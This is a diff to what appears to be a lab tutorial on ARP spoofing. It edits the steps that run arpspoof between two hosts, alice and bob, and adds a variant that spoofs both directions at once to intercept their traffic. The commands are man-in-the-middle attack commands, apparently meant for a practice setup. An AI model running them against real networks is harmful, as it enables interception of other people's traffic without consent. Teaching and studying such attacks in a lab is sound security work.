@@ -29,15 +29,16 @@ dig bob
 
 5. With this information, now run arspoof twice, once for each bash instance.
 
-In the first Terminal:
+In the attacker's Terminal:
 
 ```bash
 arpspoof -t <alice_ip> -r <bob_ip>
 ```
 
-In the second Terminal:
+Also you could explictly spoof two targets on two Terminals:
 
 ```bash
+arpspoof -t <alice_ip> <bob_ip>
 arpspoof -t <bob_ip> <alice_ip>
 ```
 
